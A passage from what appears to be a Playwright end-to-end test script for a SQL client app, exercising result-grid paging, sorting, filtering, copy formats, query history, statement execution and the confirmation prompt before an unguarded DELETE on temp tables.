  panel = await newQuery("Shop (SQLite)", "select id as a, id as b, id as c, id as d, id as e, id as f, id as g, id as h, id as i, id as j, id as k, id as l from orders limit 100;");
  await run(panel);
  await panel.locator(".statusline", { hasText: "100 rows" }).waitFor();
  const edgeGrid = panel.locator(".grid-scroller");
  const edgeBox = await edgeGrid.boundingBox();
  await page.waitForTimeout(300);
  await page.mouse.click(edgeBox.x + edgeBox.width - 30, edgeBox.y + edgeBox.height - 30, { button: "right" });
  const edgeMenu = panel.locator(".result-grid-menu");
  await edgeMenu.waitFor();
  const withinWindow = async (locator) => {
    const box = await locator.boundingBox();
    const viewport = await page.evaluate(() => ({ width: window.innerWidth, height: window.innerHeight }));
    assert.ok(box.x >= 0 && box.y >= 0 && box.x + box.width <= viewport.width && box.y + box.height <= viewport.height, JSON.stringify({ box, viewport }));
  };
  const hitTarget = async (locator) => locator.evaluate((element) => {
    const box = element.getBoundingClientRect();
    const hit = document.elementFromPoint(box.left + box.width / 2, box.top + box.height / 2);
    return hit !== null && element.contains(hit);
  });
  await withinWindow(edgeMenu);
  await edgeMenu.getByRole("menuitem", { name: "Copy ▸" }).hover();
  const edgeCopy = panel.getByRole("menu", { name: "Copy", exact: true });
  await edgeCopy.waitFor();
  await withinWindow(edgeCopy);
  assert.ok(await hitTarget(edgeCopy.getByRole("menuitem", { name: "Copy as SQL INSERT" })));
  await edgeMenu.getByRole("menuitem", { name: "Filter ▸" }).hover();
  const edgeSubmenu = panel.getByRole("menu", { name: "Filter", exact: true });
  await edgeSubmenu.waitFor();
  await withinWindow(edgeSubmenu);
  const customFilter = edgeSubmenu.getByRole("menuitem", { name: "Custom filter…" });
  assert.ok(await hitTarget(customFilter));
  await customFilter.click();
  await page.getByRole("dialog", { name: "Custom filter" }).getByRole("button", { name: "Cancel" }).click();
  await page.keyboard.press("Control+w");
  await setHistorySaving("Shop (SQLite)", true);

  step("query pages: limit, count, scroll to fetch more, and navigate");
  await setHistorySaving("Shop (SQLite)", false);
  panel = await newQuery("Shop (SQLite)", "select * from orders order by id;");
  await run(panel);
  await panel.locator(".statusline", { hasText: "500 rows" }).waitFor();
  const queryPages = panel.getByRole("group", { name: "Query result pages" });
  await queryPages.getByText("rows 1–500").waitFor();
  const accessibleGrid = panel.getByRole("grid");
  await accessibleGrid.focus();
  await accessibleGrid.getByRole("gridcell", { name: /Row 1, id \(INTEGER\): 1/ }).waitFor();
  await page.keyboard.press("ArrowRight");
  await accessibleGrid.getByRole("gridcell", { name: /Row 1, customer_id/ }).waitFor();
  await panel.getByText("Loaded rows only", { exact: true }).waitFor();
  assert.match(await panel.getByRole("searchbox", { name: "Filter rows" }).getAttribute("aria-describedby"), /.+/);
  const countButton = queryPages.getByRole("button", { name: "Count", exact: true });
  const nextButton = queryPages.getByRole("button", { name: "Next page" });
  const countBefore = await countButton.boundingBox();
  const nextBefore = await nextButton.boundingBox();
  // Reproduce the loading styles separately: the local count can finish before
  // Playwright can observe it, but its controls must occupy the same space.
  await countButton.evaluate((button) => {
    button.querySelector(".query-count-label").classList.add("busy");
    const spinner = document.createElement("span");
    spinner.className = "query-count-spinner";
    button.append(spinner);
  });
  const countDuring = await countButton.boundingBox();
  const nextDuring = await nextButton.boundingBox();
  assert.ok(Math.abs(countDuring.width - countBefore.width) < 1, "count button keeps its width while loading");
  assert.ok(Math.abs(nextDuring.x - nextBefore.x) < 1, "count loading does not move adjacent controls");
  await countButton.evaluate((button) => {
    button.querySelector(".query-count-label").classList.remove("busy");
    button.querySelector(".query-count-spinner").remove();
  });
  await countButton.click();
  await queryPages.getByText("rows 1–500 of 50,000").waitFor();
  await shot("04a-query-pages");
  const previousPageResult = await panel.getByRole("button", { name: "Result 1", exact: true }).elementHandle();
  await queryPages.getByLabel("Rows per page").selectOption("100");
  await page.waitForFunction((el) => !el.isConnected, previousPageResult);
  await panel.locator(".statusline", { hasText: "100 rows" }).waitFor();
  await panel.locator(".grid-scroller").evaluate((el) => { el.scrollTop = el.scrollHeight; });
  await panel.locator(".statusline", { hasText: "200 rows" }).waitFor();
  await queryPages.getByRole("button", { name: "Next page" }).click();
  await queryPages.getByText("rows 101–200").waitFor();
  await page.waitForFunction((el) => !el.disabled, await queryPages.getByRole("button", { name: "Previous page" }).elementHandle());
  await queryPages.getByRole("button", { name: "Previous page" }).click();
  await queryPages.getByText("rows 1–100").waitFor();
  await page.keyboard.press("Control+w");
  await setHistorySaving("Shop (SQLite)", true);

  step("SQLite: an explicit LIMIT keeps the original 50,000-row result");
  panel = await newQuery("Shop (SQLite)", "select * from orders limit 50000;");
  await run(panel);
  await panel.locator(".statusline", { hasText: "50,000 rows" }).waitFor();
  assert.equal(await panel.getByText("Loaded rows only", { exact: true }).count(), 0);
  await panel.locator(".grid-scroller").evaluate((el) => (el.scrollTop = 26 * 25_000));
  await page.waitForTimeout(500);
  await shot("04-grid-scroll");

  step("sort: header clicks sort the 50,000 rows in the core and undo it");
  const sortGrid = panel.locator(".grid-scroller");
  await sortGrid.evaluate((el) => {
    el.scrollTop = 0;
    el.scrollLeft = 0;
  });
  const sortBox = await sortGrid.boundingBox();
  // Row numbers take 64 px with 50,000 rows; then id 110, customer_id 110, created 160.
  const ID_X = 64 + 20;
  const TOTAL_X = 64 + 110 + 110 + 160 + 20;
  const sortedAs = (label) => panel.locator(`.grid-scroller[aria-label="Result with 50,000 rows${label}"]`).waitFor();
  const clickHeader = (x) => page.mouse.click(sortBox.x + x, sortBox.y + 18);
  const copyFirstRows = async (column, rows) => {
    const before = await page.evaluate(() => window.__copied.length);
    await sortGrid.evaluate((el) => {
      el.scrollTop = 0;
      el.scrollLeft = 0;
    });
    await page.mouse.click(sortBox.x + ID_X, sortBox.y + 36 + 13);
    for (let i = 0; i < column; i++) await page.keyboard.press("ArrowRight");
    for (let i = 1; i < rows; i++) await page.keyboard.press("Shift+ArrowDown");
    await page.keyboard.press("Control+c");
    return (await copied(before + 1)).trimEnd().split("\n");
  };
  await clickHeader(ID_X);
  await sortedAs(", sorted by id, ascending");
  await clickHeader(ID_X);
  await sortedAs(", sorted by id, descending");
  assert.deepEqual(await copyFirstRows(0, 2), ["50000", "49999"]);
  await clickHeader(TOTAL_X);
  await sortedAs(", sorted by total, ascending");
  await clickHeader(TOTAL_X);
  await sortedAs(", sorted by total, descending");
  const totals = (await copyFirstRows(3, 20)).map(Number);
  assert.equal(totals.length, 20);
  for (let i = 1; i < totals.length; i++) assert.ok(totals[i - 1] >= totals[i], `${totals[i - 1]} >= ${totals[i]}`);
  await shot("04b-grid-sorted");
  await clickHeader(TOTAL_X);
  await sortedAs("");
  assert.deepEqual(await copyFirstRows(0, 2), ["1", "2"]);

  step("columns: drag a header edge to resize, double-click it to fit the content");
  const widthsNow = async () => (await sortGrid.getAttribute("data-column-widths")).split(",").map(Number);
  const [idWidth, customerWidth, createdWidth] = await widthsNow();
  const createdEdge = sortBox.x + 64 + idWidth + customerWidth + createdWidth;
  await page.mouse.move(createdEdge - 1, sortBox.y + 18);
  await page.mouse.down();
  await page.mouse.move(createdEdge + 60, sortBox.y + 18, { steps: 5 });
  await page.mouse.up();
  assert.equal((await widthsNow())[2], createdWidth + 61);
  await sortedAs("");
  // "created" holds 10-character dates: fitting makes it narrower than 160 px.
  await page.mouse.dblclick(sortBox.x + 64 + idWidth + customerWidth + createdWidth + 61, sortBox.y + 18);
  for (let i = 0; i < 20 && (await widthsNow())[2] >= createdWidth; i++) await page.waitForTimeout(100);
  const fitted = (await widthsNow())[2];
  assert.ok(fitted < createdWidth && fitted > 60, `fitted width ${fitted}`);
  await sortedAs("");

  step("jump to column: Ctrl+Shift+J, type, Enter");
  await page.mouse.click(sortBox.x + ID_X, sortBox.y + 36 + 13);
  await page.keyboard.press("Control+Shift+J");
  const jump = panel.getByRole("dialog", { name: "Jump to column" });
  await jump.getByRole("textbox").fill("tot");
  assert.deepEqual(await jump.getByRole("option").allInnerTexts(), ["total"]);
  await page.keyboard.press("Enter");
  await jump.waitFor({ state: "detached" });
  {
    const before = await page.evaluate(() => window.__copied.length);
    await page.keyboard.press("Control+Shift+c");
    assert.equal((await copied(before + 1)).split("\n")[0], "total");
  }

  step("grid: spreadsheet keys select cells, rows and columns, and the footer counts them");
  const selectionText = panel.locator(".grid-selection");
  const topLeftCell = () => page.mouse.click(sortBox.x + ID_X, sortBox.y + 36 + 13);
  await sortGrid.evaluate((el) => {
    el.scrollTop = 0;
    el.scrollLeft = 0;
  });
  await topLeftCell();
  await selectionText.getByText("1 cell selected", { exact: true }).waitFor();
  await page.keyboard.press("Shift+ArrowDown");
  await page.keyboard.press("Shift+ArrowDown");
  await page.keyboard.press("Shift+ArrowRight");
  await selectionText.getByText("3 rows × 2 columns selected (6 cells)", { exact: true }).waitFor();
  await page.keyboard.press("Shift+Space");
  await selectionText.getByText("3 rows selected", { exact: true }).waitFor();
  await topLeftCell();
  await page.keyboard.press("Control+Space");
  await selectionText.getByText("1 column selected", { exact: true }).waitFor();
  // Ctrl+arrows go to the edge; Ctrl+Shift+arrows select up to it.
  await topLeftCell();
  await page.keyboard.press("Control+ArrowDown");
  {
    const before = await page.evaluate(() => window.__copied.length);
    await page.keyboard.press("Control+c");
    assert.equal((await copied(before + 1)).trimEnd(), "50000");
  }
  await page.keyboard.press("Control+Shift+ArrowUp");
  await selectionText.getByText("1 column selected", { exact: true }).waitFor();
  // From the last row: to the last column of that row.
  await page.keyboard.press("Control+Shift+End");
  await selectionText.getByText("1 row selected", { exact: true }).waitFor();
  await page.keyboard.press("Control+Home");
  await selectionText.getByText("1 cell selected", { exact: true }).waitFor();
  await page.keyboard.press("Shift+End");
  await selectionText.getByText("1 row selected", { exact: true }).waitFor();
  await page.keyboard.press("Control+a");
  await selectionText.getByText("All 50,000 rows selected", { exact: true }).waitFor();
  // Ctrl+click on a header selects the column instead of sorting.
  await page.keyboard.down("Control");
  await clickHeader(TOTAL_X);
  await page.keyboard.up("Control");
  await selectionText.getByText("1 column selected", { exact: true }).waitFor();
  await sortedAs("");
  await shot("04b2-grid-column-selected");

  step("grid: hide a column from its header, the footer shows it, the chooser brings it back");
  const CUSTOMER_X = 64 + (await widthsNow())[0] + 20;
  await page.mouse.click(sortBox.x + CUSTOMER_X, sortBox.y + 18, { button: "right" });
  const headerMenu = panel.locator(".result-grid-menu");
  await headerMenu.getByRole("menuitem", { name: "Hide customer_id" }).click();
  await headerMenu.waitFor({ state: "detached" });
  assert.equal((await widthsNow())[1], 0, "customer_id has no width while hidden");
  const hiddenButton = panel.locator(".grid-footer .grid-hidden");
  await hiddenButton.getByText("1 hidden column", { exact: true }).waitFor();
  // Selections and copies skip it: id, then created.
  await topLeftCell();
  await page.keyboard.press("Shift+ArrowRight");
  await selectionText.getByText("1 row × 2 columns selected (2 cells)", { exact: true }).waitFor();
  {
    const before = await page.evaluate(() => window.__copied.length);
    await page.keyboard.press("Control+Shift+c");
    const [header, row] = (await copied(before + 1)).trimEnd().split("\n");
    assert.equal(header, "id\tcreated");
    assert.match(row, /^1\t\d{4}-\d{2}-\d{2}/);
  }
  await shot("04b3-grid-hidden-column");
  await hiddenButton.click();
  const chooser = panel.getByRole("dialog", { name: "Columns" });
  await chooser.getByRole("searchbox").fill("cust");
  await chooser.getByRole("checkbox", { name: "customer_id" }).check();
  await hiddenButton.waitFor({ state: "detached" });
  assert.ok((await widthsNow())[1] > 0, "customer_id is shown again");
  await page.keyboard.press("Escape");
  await chooser.waitFor({ state: "detached" });

  step("grid: freeze the first column, it stays while the others scroll");
  // "total" made wide enough for the grid to scroll sideways.
  const totalEdge = sortBox.x + 64 + (await widthsNow()).reduce((a, b) => a + b, 0);
  await page.mouse.move(totalEdge - 1, sortBox.y + 18);
  await page.mouse.down();
  await page.mouse.move(totalEdge + 1200, sortBox.y + 18, { steps: 5 });
  await page.mouse.up();
  await sortedAs("");
  assert.ok((await sortGrid.evaluate((el) => el.scrollWidth - el.clientWidth)) > 400, "the grid scrolls sideways");
  await page.mouse.click(sortBox.x + ID_X, sortBox.y + 18, { button: "right" });
  await headerMenu.getByRole("menuitemcheckbox", { name: "Freeze first column" }).click();
  await sortGrid.evaluate((el) => (el.scrollLeft = 400));
  await page.waitForTimeout(100);
  assert.equal(await sortGrid.evaluate((el) => el.scrollLeft), 400);
  await page.mouse.click(sortBox.x + ID_X, sortBox.y + 36 + 13);
  {
    const before = await page.evaluate(() => window.__copied.length);
    await page.keyboard.press("Control+c");
    assert.equal((await copied(before + 1)).trimEnd(), "1", "the frozen id column is still under the pointer");
  }
  await shot("04b4-grid-frozen");
  await page.mouse.click(sortBox.x + ID_X, sortBox.y + 18, { button: "right" });
  const unfreeze = headerMenu.getByRole("menuitemcheckbox", { name: "Freeze first column" });
  assert.equal(await unfreeze.getAttribute("aria-checked"), "true");
  await unfreeze.click();
  // Unfrozen, the same place shows a column that scrolled in.
  await page.mouse.click(sortBox.x + ID_X, sortBox.y + 36 + 13);
  {
    const before = await page.evaluate(() => window.__copied.length);
    await page.keyboard.press("Control+c");
    assert.notEqual((await copied(before + 1)).trimEnd(), "1", "id scrolled away");
  }
  // Fit "total" back to its content, from its edge at the far right.
  const farLeft = await sortGrid.evaluate((el) => (el.scrollLeft = el.scrollWidth - el.clientWidth));
  await page.waitForTimeout(100);
  await page.mouse.dblclick(sortBox.x + 64 + (await widthsNow()).reduce((a, b) => a + b, 0) - farLeft - 1, sortBox.y + 18);
  for (let i = 0; i < 20 && (await widthsNow())[3] > 400; i++) await page.waitForTimeout(100);
  assert.ok((await widthsNow())[3] < 400, "total fitted back");
  await sortGrid.evaluate((el) => (el.scrollLeft = 0));
  await sortedAs("");

  step("grid look: zebra rows switched off in Settings repaint the grid");
  const createdRight = 64 + (await widthsNow()).slice(0, 3).reduce((a, b) => a + b, 0) - 4;
  const rowY = (row) => 36 + row * 26 + 13;
  assert.notEqual(await pixel(panel, createdRight, rowY(3)), await pixel(panel, createdRight, rowY(4)), "odd rows are tinted");
  await setGridLook({ zebra: false });
  assert.equal(await pixel(panel, createdRight, rowY(3)), await pixel(panel, createdRight, rowY(4)), "no tint without zebra rows");
  await setGridLook({ zebra: true });

  step("find: Ctrl+F searches the 50,000 rows in the core, Enter and F3 step through the matches");
  await sortGrid.evaluate((el) => {
    el.scrollTop = 0;
    el.scrollLeft = 0;
  });
  await topLeftCell();
  await page.keyboard.press("Control+f");
  const findBar = panel.getByRole("search", { name: "Find in results" });
  const findStatus = findBar.getByRole("status");
  // 4999, 14999, 24999, 34999, 44999 and 49990–49999: only ids hold it.
  await findBar.getByRole("searchbox").fill("4999");
  await findStatus.getByText("1 of 15", { exact: true }).waitFor();
  await page.keyboard.press("Enter");
  await findStatus.getByText("2 of 15", { exact: true }).waitFor();
  await sortGrid.focus();
  {
    // The active cell follows the match.
    const before = await page.evaluate(() => window.__copied.length);
    await page.keyboard.press("Control+c");
    assert.equal((await copied(before + 1)).trimEnd(), "14999");
  }
  await page.keyboard.press("F3");
  await findStatus.getByText("3 of 15", { exact: true }).waitFor();
  await page.keyboard.press("Shift+F3");
  await page.keyboard.press("Shift+F3");
  await page.keyboard.press("Shift+F3");
  // Before the first comes the last.
  await findStatus.getByText("15 of 15", { exact: true }).waitFor();
  await shot("04b5-grid-find");
  // Hidden columns are not searched.
  await page.mouse.click(sortBox.x + ID_X, sortBox.y + 18, { button: "right" });
  await headerMenu.getByRole("menuitem", { name: "Hide id" }).click();
  await findStatus.getByText("No results", { exact: true }).waitFor();
  await hiddenButton.click();
  await chooser.getByRole("button", { name: "Show all" }).click();
  await page.keyboard.press("Escape");
  await findStatus.getByText(/^\d+ of 15$/).waitFor();
  await findBar.getByRole("searchbox").focus();
  await page.keyboard.press("Escape");
  await findBar.waitFor({ state: "detached" });

  step("copy: an HTML table, column names quoted, and every value of a column as an IN list");
  // The search scrolled to its last match: back to the first rows.
  await sortGrid.evaluate((el) => {
    el.scrollTop = 0;
    el.scrollLeft = 0;
  });
  await page.waitForTimeout(100);
  await topLeftCell();
  await page.keyboard.press("Shift+ArrowRight");
  await page.keyboard.press("Shift+ArrowDown");
  await page.mouse.click(sortBox.x + ID_X, sortBox.y + 36 + 13, { button: "right" });
  const cellMenu = panel.locator(".result-grid-menu");
  {
    const before = await page.evaluate(() => window.__copied.length);
    await cellMenu.getByRole("menuitem", { name: "Copy ▸" }).hover();
    await panel.getByRole("menuitem", { name: "Copy as HTML table" }).click();
    const html = await copied(before + 1);
    assert.ok(html.startsWith("<table>\n  <thead>\n    <tr><th>id</th><th>customer_id</th></tr>"), html);
    assert.match(html, /<tr><td>1<\/td><td>\d+<\/td><\/tr>\n    <tr><td>2<\/td>/);
  }
  await page.mouse.click(sortBox.x + ID_X, sortBox.y + 36 + 13, { button: "right" });
  {
    const before = await page.evaluate(() => window.__copied.length);
    await cellMenu.getByRole("menuitem", { name: "Copy column names ▸" }).hover();
    await panel.getByRole("menuitem", { name: "Quoted for this database" }).click();
    assert.equal(await copied(before + 1), '"id", "customer_id"');
  }
  await page.mouse.click(sortBox.x + CUSTOMER_X, sortBox.y + 18, { button: "right" });
  {
    const before = await page.evaluate(() => window.__copied.length);
    await headerMenu.getByRole("menuitem", { name: "Copy all values as SQL IN list" }).click();
    const list = await copied(before + 1);
    assert.match(list, /^\(\d+(, \d+)*\)$/);
    const values = list.slice(1, -1).split(", ");
    assert.equal(new Set(values).size, values.length, "each customer once");
    assert.ok(values.length > 100 && values.length <= 500, `${values.length} customers`);
  }

  step("filter by this value: contains, from the cell menu, on the loaded rows");
  await page.mouse.click(sortBox.x + ID_X, sortBox.y + 36 + 13, { button: "right" });
  await cellMenu.getByRole("menuitem", { name: "Filter ▸" }).hover();
  await panel.getByRole("menuitem", { name: "id contains '1'" }).click();
  await panel.locator(".filter-chip", { hasText: "id contains '1'" }).waitFor();
  await panel.locator(".statusline", { hasText: /^[\d,]+ of 50,000 rows/ }).waitFor();
  await panel.getByRole("button", { name: "Reset filters" }).click();
  await panel.locator(".statusline", { hasText: /^50,000 rows/ }).waitFor();

  step("filter: the core keeps the rows with the text, sorting and copy follow");
  const filterBox = panel.getByRole("searchbox", { name: "Filter rows" });
  await filterBox.fill("4999");
  await panel.locator(".statusline", { hasText: "15 of 50,000 rows" }).waitFor();
  assert.deepEqual(await copyFirstRows(0, 3), ["4999", "14999", "24999"]);
  // Two quick clicks: the second cycles from the first even before the core answers.
  await clickHeader(ID_X);
  await clickHeader(ID_X);
  await panel.locator('.grid-scroller[aria-label="Result with 15 rows, sorted by id, descending"]').waitFor();
  assert.deepEqual(await copyFirstRows(0, 2), ["49999", "49998"]);
  await shot("04c-grid-filtered");
  await filterBox.press("Escape");
  await panel.locator(".statusline", { hasText: "50,000 rows" }).waitFor();
  await clickHeader(ID_X);
  await sortedAs("");

  step("error with its position underlined");
  panel = await newQuery("Shop (SQLite)", "select id, total\nfrom ordrs\nwhere total > 100;");
  await run(panel);
  await panel.locator(".messages", { hasText: "ordrs" }).waitFor();
  await panel.locator(".cm-lintRange-error").waitFor();
  await setLanguage("es");
  await panel.locator(".error-box", { hasText: "no such table: ordrs" }).waitFor();
  await page.getByRole("button", { name: "Historial de consultas", exact: true }).waitFor();
  await setLanguage("en");
  await shot("05-error");

  step("history: successes, errors, search and reopening without execution");
  await page.getByRole("button", { name: "Query history", exact: true }).click();
  let history = page.getByRole("complementary", { name: "Query history", exact: true });
  await waitForHistoryCount(4);
  const errorEntry = history.locator(".history-entry").filter({ has: page.locator(".history-sql", { hasText: "from ordrs" }) });
  await errorEntry.locator(".history-error", { hasText: "ordrs" }).waitFor();
  await errorEntry.getByText("0 rows returned", { exact: true }).waitFor();
  const aggregateEntry = history.locator(".history-entry").filter({ has: page.locator(".history-sql", { hasText: "group by c.country" }) });
  await aggregateEntry.getByText("6 rows returned", { exact: true }).waitFor();
  assert.match(await aggregateEntry.locator(".history-meta").innerText(), /\d+ ms/);
  assert.ok(await aggregateEntry.locator("time").getAttribute("datetime"));
  await history.getByRole("textbox", { name: "Search query history" }).fill("ORDRS");
  await waitForHistoryCount(1);
  await history.locator(".history-error", { hasText: "ordrs" }).waitFor();
  await history.getByRole("textbox", { name: "Search query history" }).fill("round");
  await waitForHistoryCount(1);
  await history.locator(".history-sql", { hasText: "group by c.country" }).waitFor();
  const reopenedSql = await history.locator(".history-sql").innerText();
  const tabsBefore = await page.getByRole("tab").count();
  await shot("05a-history");
  await history.getByRole("button", { name: "Open in new tab" }).click();
  panel = page.locator(".tab-panel:not([hidden])");
  assert.equal(await page.getByRole("tab").count(), tabsBefore + 1);
  assert.equal(await panel.locator(".cm-content").innerText(), reopenedSql);
  await panel.getByText("Disconnected", { exact: true }).waitFor();
  await panel.getByText("Write a query and press Ctrl+Enter.", { exact: true }).waitFor();
  assert.equal(await panel.locator(".grid-host").count(), 0);
  await page.getByRole("button", { name: "Query history", exact: true }).click();
  await waitForHistoryCount(4);
  await page.getByRole("button", { name: "Close query history" }).click();

  step("history disabled: successful and failed SQL leave no entries");
  await setHistorySaving("Shop (SQLite)", false, "05b0-connection-menu");
  assert.equal(await panel.getByRole("checkbox").count(), 0, "the editor toolbar no longer has the history checkbox");
  await replaceQuery(panel, "select 'private_history_marker' as secret;");
  await run(panel);
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  await panel.getByRole("button", { name: "Run", exact: true }).waitFor();
  await replaceQuery(panel, "select private_error_marker from no_history_private_table;");
  await run(panel);
  await panel.locator(".messages", { hasText: "no_history_private_table" }).waitFor();
  await panel.getByRole("button", { name: "Run", exact: true }).waitFor();
  await page.getByRole("button", { name: "Query history", exact: true }).click();
  await waitForHistoryCount(4);
  await history.getByRole("textbox", { name: "Search query history" }).fill("private");
  await history.getByText("No matching queries.", { exact: true }).waitFor();
  await shot("05b-history-disabled");
  await page.getByRole("button", { name: "Close query history" }).click();

  step("Ctrl+Enter runs the statement under the cursor, Ctrl+Shift+Enter all of them");
  await replaceQuery(panel, "select 'first' as which;\nselect 'second;' as which;\n\n-- the third\nselect 'third' as which");
  const firstCell = async () => {
    // Between two runs the grid is replaced: wait until the new one is there.
    const grid = panel.locator(".grid-scroller");
    await grid.waitFor();
    let box = await grid.boundingBox();
    for (let i = 0; i < 40 && !box; i++) {
      await page.waitForTimeout(100);
      box = await grid.boundingBox();
    }
    const before = await page.evaluate(() => window.__copied.length);
    await page.mouse.click(box.x + 80, box.y + 36 + 13);
    await page.keyboard.press("Control+c");
    return (await copied(before + 1)).trimEnd();
  };
  const sqlEditor = panel.locator(".cm-content");
  await sqlEditor.click();
  await page.keyboard.press("Control+Home");
  await page.keyboard.press("ArrowDown");
  await page.keyboard.press("End");
  await page.keyboard.press("Control+Enter");
  await panel.locator(".cm-ran", { hasText: "select 'second;' as which" }).waitFor();
  await shot("05c-statement-under-cursor");
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  assert.equal(await panel.locator(".result-tabs button", { hasText: /^Result/ }).count(), 1);
  assert.equal(await firstCell(), "second;");
  await sqlEditor.click();
  await page.keyboard.press("Control+End");
  await page.keyboard.press("Control+Enter");
  await panel.getByRole("button", { name: "Run", exact: true }).waitFor();
  await page.waitForFunction(() => document.querySelector(".cm-ran")?.textContent?.includes("-- the third"));
  // The status line already says "1 row" from the previous run: wait for the new value.
  let third = "";
  for (let i = 0; i < 20 && third !== "third"; i++) {
    third = await firstCell();
    if (third !== "third") await page.waitForTimeout(250);
  }
  assert.equal(third, "third");

  step("editor toolbar: run the current statement or selection, and run the whole script");
  const actions = panel.getByRole("toolbar", { name: "Query actions" });
  assert.deepEqual(await actions.getByRole("button").evaluateAll((buttons) => buttons.map((button) => button.getAttribute("aria-label"))), ["Run", "Run script", "Run options", "Format", "Save"]);
  for (const button of await actions.getByRole("button").all()) assert.ok(await button.getAttribute("title"));
  await sqlEditor.click();
  await page.keyboard.press("Control+Home");
  await page.keyboard.press("ArrowDown");
  await page.keyboard.press("End");
  let previousResult = await panel.getByRole("button", { name: "Result 1", exact: true }).elementHandle();
  await actions.getByRole("button", { name: "Run", exact: true }).click();
  await page.waitForFunction((button) => !button.isConnected, previousResult);
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  let selected = "";
  for (let i = 0; i < 20 && selected !== "second;"; i++) {
    selected = await firstCell();
    if (selected !== "second;") await page.waitForTimeout(250);
  }
  assert.equal(selected, "second;");
  assert.equal(await panel.locator(".result-tabs button", { hasText: /^Result/ }).count(), 1);
  await sqlEditor.click();
  await page.keyboard.press("Control+Home");
  await page.keyboard.press("Shift+End");
  previousResult = await panel.getByRole("button", { name: "Result 1", exact: true }).elementHandle();
  await actions.getByRole("button", { name: "Run", exact: true }).click();
  await page.waitForFunction((button) => !button.isConnected, previousResult);
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  selected = "";
  for (let i = 0; i < 20 && selected !== "first"; i++) {
    selected = await firstCell();
    if (selected !== "first") await page.waitForTimeout(250);
  }
  assert.equal(selected, "first");
  await sqlEditor.click();
  await page.keyboard.press("Control+Home");
  await page.keyboard.press("Shift+End");
  await actions.getByRole("button", { name: "Run script", exact: true }).click();
  await panel.locator(".result-tabs button", { hasText: "Result 3" }).waitFor();
  await sqlEditor.click();
  await page.keyboard.press("Control+Shift+Enter");
  await panel.locator(".result-tabs button", { hasText: "Result 3" }).waitFor();

  step("risky statements: the core asks before a DELETE without WHERE runs");
  await replaceQuery(panel, "create temp table scratch (x);\ninsert into scratch values (1), (2);\ndelete from scratch;");
  await run(panel);
  let risk = page.getByRole("dialog", { name: "Run these statements?" });
  await risk.getByText("DELETE without WHERE: deletes every row").waitFor();
  assert.equal(await risk.locator(".risk-list li").count(), 1);
  assert.equal(await risk.locator(".risk-list pre").innerText(), "delete from scratch");
  // Cancel has the focus, so a reflex Enter does not run it.
  await page.keyboard.press("Enter");
  await risk.waitFor({ state: "detached" });
  await panel.locator(".result-tabs button", { hasText: "Result 3" }).waitFor();
  await actions.getByRole("button", { name: "Run script", exact: true }).click();
  risk = page.getByRole("dialog", { name: "Run these statements?" });
  await shot("05d-risky-statements");
  await risk.getByRole("button", { name: "Run anyway" }).click();
  await risk.waitFor({ state: "detached" });
  await panel.getByText("Statement 3: 2 rows", { exact: false }).waitFor();

  step("script runs: continue, ask (skip, stop), the summary, and the guard in every mode");
  // The tab's run options choose; the core runs the statements and counts them (ADR-035).
  async function runOptions(choose) {
    await actions.getByRole("button", { name: "Run options" }).click();
    const options = page.getByRole("dialog", { name: "Run options for this tab" });
    await options.waitFor();
    await choose(options);
    await page.keyboard.press("Escape");
    await options.waitFor({ state: "detached" });
  }
  async function showMessages() {
    await panel.locator(".result-tabs button", { hasText: /^Messages/ }).click();
  }
  await runOptions((options) => options.getByRole("radio", { name: "Continue", exact: true }).check());
  assert.match(await actions.getByRole("button", { name: "Run options" }).getAttribute("title"), /Continue/);
  await replaceQuery(panel, "create temp table runs (id integer primary key);\ninsert into runs values (1);\ninsert into runs values (1);\ninsert into runs values (2);\nselect count(*) from runs;");
  await run(panel);
  await panel.locator(".statusline", { hasText: "4 OK, 1 failed, 0 not run" }).waitFor();
  await showMessages();
  await panel.getByText("Statement 3: UNIQUE constraint failed", { exact: false }).waitFor();
  await panel.getByText("5 statements: 4 OK, 1 failed, 0 not run", { exact: false }).waitFor();
  await panel.getByText("Statement 4: 1 row (", { exact: false }).waitFor();
  assert.ok(await panel.getByText(/ms execute, \d+ ms fetch/).first().isVisible(), "timing split into execute and fetch");
  // Continue never skips the confirmation of a risky statement.
  await replaceQuery(panel, "delete from runs;\nselect 1;");
  await run(panel);
  risk = page.getByRole("dialog", { name: "Run these statements?" });
  await risk.getByText("DELETE without WHERE: deletes every row").waitFor();
  await risk.getByRole("button", { name: "Cancel" }).click();
  await risk.waitFor({ state: "detached" });
  // Ask: the run pauses on the error and waits for the answer.
  await runOptions((options) => options.getByRole("radio", { name: "Ask", exact: true }).check());
  await replaceQuery(panel, "insert into runs values (2);\nselect 1;\nselect 2;");
  await run(panel);
  let paused = page.getByRole("dialog", { name: "Statement 1 failed" });
  await paused.getByText("2 statements after it have not run yet.").waitFor();
  await paused.getByText("UNIQUE constraint failed", { exact: false }).waitFor();
  await shot("05e-script-error-ask");
  await paused.getByRole("button", { name: "Skip and continue" }).click();
  await paused.waitFor({ state: "detached" });
  await panel.locator(".statusline", { hasText: "2 OK, 1 failed, 0 not run" }).waitFor();
  // Stop has the focus; Escape stops too.
  await run(panel);
  paused = page.getByRole("dialog", { name: "Statement 1 failed" });
  await paused.waitFor();
  await page.keyboard.press("Escape");
  await paused.waitFor({ state: "detached" });
  await panel.locator(".statusline", { hasText: "0 OK, 1 failed, 2 not run" }).waitFor();
  await showMessages();
  await panel.getByText("Stopped at statement 1, which failed.").waitFor();
  // A statement timeout of this tab: the endless query is cancelled and the run goes on.
  await runOptions(async (options) => {
    await options.getByRole("radio", { name: "Continue", exact: true }).check();
    await options.getByLabel("Statement timeout (seconds)").fill("1");
    await options.getByLabel("Statement timeout (seconds)").press("Enter");
  });
  await replaceQuery(panel, "with recursive r(i) as (select 1 union all select i + 1 from r) select count(*) from r;\nselect 'after the timeout';");
  await run(panel);
  await panel.locator(".statusline", { hasText: "1 OK, 1 failed, 0 not run" }).waitFor({ timeout: 30_000 });
  await showMessages();
  await panel.getByText("Statement 1: timed out.", { exact: false }).waitFor();
  await runOptions((options) => options.getByRole("button", { name: "Use the defaults" }).click());
  assert.match(await actions.getByRole("button", { name: "Run options" }).getAttribute("title"), /Stop/);
  // The default comes from Settings › Scripts.
  await withSettings("scripts", async (settings) => {
    await settings.getByRole("radio", { name: "Continue with the next statement" }).check();
